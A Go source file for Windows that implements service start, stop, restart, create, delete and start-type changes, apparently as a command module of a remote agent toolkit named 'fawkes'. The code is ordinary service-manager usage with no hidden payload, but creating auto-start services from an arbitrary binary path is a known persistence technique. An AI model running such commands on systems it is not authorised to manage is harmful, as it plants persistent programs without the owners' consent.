//go:build windows
// +build windows

// service_operations.go contains service lifecycle operations: start, stop,
// restart, create, delete, and start type modification. Extracted from
// service.go for maintainability.

package commands

import (
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

func serviceStart(args serviceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required to start a service")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(args.Name)
	if err != nil {
		return errorf("Error opening service '%s': %v", args.Name, err)
	}
	defer s.Close()

	err = s.Start()
	if err != nil {
		return errorf("Error starting service '%s': %v", args.Name, err)
	}

	return successf("Started service '%s'", args.Name)
}

func serviceStop(args serviceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required to stop a service")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(args.Name)
	if err != nil {
		return errorf("Error opening service '%s': %v", args.Name, err)
	}
	defer s.Close()

	status, err := s.Control(svc.Stop)
	if err != nil {
		return errorf("Error stopping service '%s': %v", args.Name, err)
	}

	return successf("Stopped service '%s' (state: %s)", args.Name, describeServiceState(status.State))
}

func serviceRestart(args serviceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required to restart a service")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(args.Name)
	if err != nil {
		return errorf("Error opening service '%s': %v", args.Name, err)
	}
	defer s.Close()

	_, err = s.Control(svc.Stop)
	if err != nil {
		return errorf("Error stopping service '%s': %v", args.Name, err)
	}

	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		status, qErr := s.Query()
		if qErr != nil {
			return errorf("Error querying service '%s': %v", args.Name, qErr)
		}
		if status.State == svc.Stopped {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

	err = s.Start()
	if err != nil {
		return errorf("Service '%s' stopped but failed to start: %v", args.Name, err)
	}

	return successf("Restarted service '%s'", args.Name)
}

func serviceCreate(args serviceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required for service creation")
	}
	if args.BinPath == "" {
		return errorResult("Error: binpath is required for service creation")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	startType := mgr.StartManual
	switch strings.ToLower(args.Start) {
	case "auto":
		startType = mgr.StartAutomatic
	case "disabled":
		startType = mgr.StartDisabled
	}

	displayName := args.Display
	if displayName == "" {
		displayName = args.Name
	}

	s, err := m.CreateService(args.Name, args.BinPath, mgr.Config{
		StartType:   uint32(startType),
		DisplayName: displayName,
	})
	if err != nil {
		return errorf("Error creating service '%s': %v", args.Name, err)
	}
	defer s.Close()

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Created service '%s':\n", args.Name))
	sb.WriteString(fmt.Sprintf("  Binary Path:  %s\n", args.BinPath))
	sb.WriteString(fmt.Sprintf("  Display Name: %s\n", displayName))
	startTypeStr := "Manual"
	switch startType {
	case mgr.StartAutomatic:
		startTypeStr = "Automatic"
	case mgr.StartDisabled:
		startTypeStr = "Disabled"
	}
	sb.WriteString(fmt.Sprintf("  Start Type:   %s\n", startTypeStr))

	return successResult(sb.String())
}

func serviceDelete(args serviceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required for service deletion")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(args.Name)
	if err != nil {
		return errorf("Error opening service '%s': %v", args.Name, err)
	}
	defer s.Close()

	err = s.Delete()
	if err != nil {
		return errorf("Error deleting service '%s': %v", args.Name, err)
	}

	return successf("Deleted service '%s'", args.Name)
}

// serviceSetStartType changes a service's start type (enable=auto, disable=disabled).
func serviceSetStartType(args serviceArgs, startType uint32) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required")
	}

	m, err := mgr.Connect()
	if err != nil {
		return errorf("Error connecting to SCM: %v", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(args.Name)
	if err != nil {
		return errorf("Error opening service '%s': %v", args.Name, err)
	}
	defer s.Close()

	cfg, err := s.Config()
	if err != nil {
		return errorf("Error reading config for '%s': %v", args.Name, err)
	}

	oldType := startTypeToString(cfg.StartType)
	cfg.StartType = startType

	if err := s.UpdateConfig(cfg); err != nil {
		return errorf("Error updating service '%s': %v", args.Name, err)
	}

	newType := startTypeToString(startType)
	return successf("Service '%s': start type changed from %s to %s", args.Name, oldType, newType)
}

func startTypeToString(st uint32) string {
	switch st {
	case uint32(mgr.StartAutomatic):
		return "Automatic"
	case uint32(mgr.StartManual):
		return "Manual"
	case uint32(mgr.StartDisabled):
		return "Disabled"
	default:
		return fmt.Sprintf("Unknown(%d)", st)
	}
}
